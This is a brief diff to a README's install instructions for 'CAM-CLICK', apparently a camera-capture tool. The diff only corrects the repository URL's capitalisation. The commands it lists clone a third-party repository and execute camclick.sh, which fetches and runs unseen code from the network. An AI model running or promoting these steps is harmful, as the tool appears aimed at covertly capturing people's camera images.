@@ -31,8 +31,8 @@
 ```
 $ apt update && apt upgrade
 $ apt install git php wget curl jq
-$ git clone https://github.com/hackelite01/CAM-CLICK.git
-$ cd CAM-CLICK
+$ git clone https://github.com/hackelite01/Cam-Click.git
+$ cd Cam-Click
 $ chmod +x camclick.sh
 $ ./camclick.sh
 ```
